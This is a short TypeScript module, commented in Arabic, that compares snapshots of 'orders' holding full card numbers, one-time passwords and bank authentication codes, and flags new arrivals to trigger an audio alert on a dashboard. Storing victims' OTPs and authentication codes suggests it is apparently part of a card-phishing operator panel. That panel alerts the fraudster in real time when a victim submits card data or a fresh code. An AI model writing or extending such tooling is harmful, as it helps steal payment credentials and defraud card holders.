/* منطق اكتشاف وصول بيانات حساسة جديدة لتشغيل الإشعار الصوتي في لوحة التحكم */

export interface AlertOrderLike {
  id: string;
  cardNumber: string;
  otp: string;
  otpHistory?: string[];
  bankAuth: string;
  authCount?: number;
}

// توصيف لقطة حساسة لكل طلب: رقم البطاقة + عدد رموز OTP + عدد المصادقات
export function snapshotOf(o: AlertOrderLike): string {
  const otpCount = o.otpHistory?.length ?? (o.otp && o.otp !== "-" ? 1 : 0);
  const authCount = o.authCount ?? (o.bankAuth && o.bankAuth !== "-" ? 1 : 0);
  return `${o.cardNumber}|${otpCount}|${authCount}`;
}

// هل ظهرت بيانات جديدة (رقم بطاقة جديد، أو رمز OTP إضافي، أو مصادقة إضافية)؟
// prev و cur من ناتج snapshotOf. إذا كان prev غير معرّف => طلب جديد كلياً (لا تنبيه).
export function hasNewSensitiveData(prev: string | undefined, cur: string): boolean {
  if (prev === undefined) return false;
  const [pCard, pOtpCount, pAuthCount] = prev.split("|");
  const [cCard, cOtpCount, cAuthCount] = cur.split("|");
  const cardNew = pCard === "-" && cCard !== "-";
  const otpNew = Number(cOtpCount) > Number(pOtpCount);
  const authNew = Number(cAuthCount) > Number(pAuthCount);
  return cardNew || otpNew || authNew;
}
